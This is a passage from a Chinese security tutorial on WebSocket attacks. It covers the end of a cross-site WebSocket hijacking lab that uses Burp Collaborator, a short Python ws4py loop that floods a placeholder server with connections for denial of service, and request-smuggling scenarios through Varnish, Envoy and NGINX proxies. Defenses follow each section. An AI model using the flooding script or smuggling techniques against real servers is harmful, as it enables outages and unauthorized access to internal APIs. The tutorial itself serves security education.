[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153617-a8c77b5a-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153617-a8c77b5a-7ea6-1.png)

Step 7：点击"Veiw Exploit"

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153633-b23620b0-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153633-b23620b0-7ea6-1.png)

Step 8：之后收到DNS请求

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153648-bacf6e16-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153648-bacf6e16-7ea6-1.png)

Step 9：之后点击"Deliver exploit to victim"  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153705-c4f4d700-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153705-c4f4d700-7ea6-1.png)  
之后在Burp Collaborator界面点击Poll now，去查找泄露的信息  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153721-ced1d28c-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153721-ced1d28c-7ea6-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153732-d4f98704-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153732-d4f98704-7ea6-1.png)

#### 防御措施

*   检查客户端请求中的Origin信息是否跨域
*   通过使用Token来验证用户身份防止跨域

### 拒绝服务

#### 基本介绍

由于WebSocket是面向连接的协议，且通过我们之前的实例我们会发现在完成一次请求处理之后，后续由于Keep-Alive导致服务器接受完信息后不会关闭TCP连接，而后续对相同目标服务器的请求也将一律采用这个TCP连接，此时我们就会想到一个问题：如果WebSocket未限制链接数量，那么此时将会带来被DOS攻击的风险，同时需要注意的一点就是WebSocket的连接数量限制和HTTP连接限制并不完全相同，它对于浏览器有差异，例如：火狐浏览器默认最大连接数为200

#### 利用方式

WebSocket建立的连接是持久性的连接，当且仅当客户端或者服务器中的一方主动发起断开链接请求(Opcode 8的关闭帧)时才会关闭，那么我们的利用方式也就显得很是简单了，我们只需要发起大量的连接请求耗尽服务器资源即可实现拒绝服务攻击

Step 1：导入依赖

python -m pip install ws4py from ws4py.client.threadedclient import WebSocketClient

Step 2：发起连接请求

class WS_Client(WebSocketClient):
    def opened(self):
        reqData = "Hello"
        self.send(reqData)

    def closed(self, code, reason=None):
        print("\[-\] Closed down:", code, reason)

    def received_message(self, resp):
        resp = json.loads(str(resp))
        print(resp)

if \_\_name\_\_ == '\_\_main\_\_':
    while True:
        ws = WS_Client("wss://x.x.x.x:443")
        ws.connect()

#### 防御措施

*   限制单一IP的最大连接数
*   设置最大连接时效时间(貌似过于理想化，不太行)

请求走私
----

### 反向代理

目前大多数WEB服务器、负载平衡器和HTTP代理都允许代理WebSocket流量，下面让我们观察一下在反向代理的环境中WebSocket通信应该如何进行，下面描述了一幅理想的图片：

第一步：客户端向反向代理发送升级请求，代理通过检查HTTP方法、"Upgrade"、"Sec WebSocket version"、"SecWebSocket Key"标头的存在等来检查传入请求是否确实是升级请求，如果请求是正确的升级请求，代理会将其转换为后端  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153911-0ff916d0-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153911-0ff916d0-7ea7-1.png)

第二步：后端用状态代码为"101"的HTTP响应回答反向代理，响应还具有"Upgrade"和"Sec-WebSocket-Accept"标头，反向代理应该通过检查状态代码和其他标头来检查后端是否确实准备好建立WebSocket连接，如果一切都正确，那么反向代理将响应从后端转换到客户端

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153924-17c0234a-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153924-17c0234a-7ea7-1.png)

第三步：代理不会关闭客户端和后端之间的TCP或TLS连接，他们都同意使用此连接进行WebSocket通信，因此客户端和后端可以来回发送WebSocket帧，此时的代理应该检查客户端是否发送屏蔽(MASKED = MASK ^ DATA (^ - XOR)，该机制可防止缓存中毒和请求走私)的WebSocket帧

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153937-1f85b428-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153937-1f85b428-7ea7-1.png)

### 请求走私

事实上由于反向代理的行为可能不同并且不完全遵守RFC 6445标准，从而导致导致走私攻击的发生

#### 示例场景1

假设我们有公开公共WebSocket API的后端，也有外部不可用的内部REST API，此时恶意客户端希望访问内部REST API  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154005-304cb680-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154005-304cb680-7ea7-1.png)  
第一步：客户端向反向代理发送升级请求，但标头"Sec-WebSocket-version"中的协议版本错误，代理未验证"Sec-WebSocket-Version"标头并认为升级请求正确并将请求转到后端  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154019-38af1494-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154019-38af1494-7ea7-1.png)

第二步：后端发送状态代码为"426"的响应，因为标头"Sec-WebSocket-version"中的协议版本不正确，然而反向代理没有检查来自后端的足够响应(包括状态代码)并认为后端已准备好进行WebSocket通信，此外它还将请求转换为客户端

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154035-422e2bd6-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154035-422e2bd6-7ea7-1.png)

第三步：反向代理认为在客户端和后端之间建立了WebSocket连接，而实际上没有WebSocket连接，因为后端拒绝了升级请求，同时代理将客户端和后端之间的TCP或TLS连接保持在打开状态，故而客户端可以通过连接发送HTTP请求轻松访问私有REST API  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154049-4ab48354-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154049-4ab48354-7ea7-1.png)  
以下反向代理受到影响：

*   Varnish反向代理
*   Envoy反向代理1.8.0(或更早版本)

#### 示例场景2

大多数反向代理在握手部分检查来自后端的状态代码，这使得攻击变得更加困难，但也并非不可能，下面我们观察第二种情况，假设我们现在有公开公共WebSocket API和公共REST API用于health检查的后端，也有外部无法使用的内部REST API，恶意客户端希望访问内部REST API，在这里我们使用NGINX来作反向代理，WebSocket API在路径/API/socket.io/上可用，healthcheck API在/api/health上可用  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154119-5c53f7b6-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154119-5c53f7b6-7ea7-1.png)

通过发送POST请求调用Healthcheck API，名称为"u"的参数控制URL，后端请求外部资源并将状态代码返回给客户端

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154134-6593a68c-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154134-6593a68c-7ea7-1.png)

第一步：客户端发送POST请求以调用healthcheck API，但带有额外的HTTP头"Upgrade:websocket"，NGINX认为这是一个正常的升级请求，它只查找"Upgrade"标头并跳过请求的其他部分，之后进一步的代理将请求转换到后端

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154150-6f44d7f0-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154150-6f44d7f0-7ea7-1.png)  
第二步：后端调用healtcheck API，它到达由恶意用户控制的外部资源，恶意用户返回状态代码为"101"的HTTP响应，后端将该响应转换为反向代理，由于NGINX只验证状态代码，所以它会认为后端已经为WebSocket通信做好了准备，此外它还将请求转换为客户端

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154210-7a9e674c-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154210-7a9e674c-7ea7-1.png)

第三步：NGINX认为在客户端和后端之间建立了WebSocket连接，实际上并没有WebSocket连接—在后端调用了healthcheck REST API，同时反向代理将客户端和后端之间的TCP或TLS连接保持在打开状态，客户端可以通过连接发送HTTP请求轻松访问私有REST API，目前大多数反向代理应该受到这种情况的影响，然而利用该漏洞需要存在外部SSRF漏洞(通常被认为是低严重性问题)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218154223-829ee4da-7ea7-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218154223-829ee4da-7ea7-1.png)

防御措施
----

*   WebSocket连接进行身份认证
*   WebSocket连接能用WSS就别用WS
*   WebSocket连接验证请求源规避跨域攻击
*   WebSocket请求头中的数据秉持不可信原理对其进行严格检查
*   WebSocket请求数据参数进行合法性检查，规避OWASP Top 10类漏洞

参考链接
----

[https://tools.ietf.org/html/rfc6455](https://tools.ietf.org/html/rfc6455)  
[https://baike.baidu.com/item/WebSocket](https://baike.baidu.com/item/WebSocket)  
[https://portswigger.net/web-security/websockets](https://portswigger.net/web-security/websockets)  
[https://github.com/0ang3el/websocket-smuggle](https://github.com/0ang3el/websocket-smuggle)  
[https://www.freebuf.com/articles/web/281451.html](https://www.freebuf.com/articles/web/281451.html)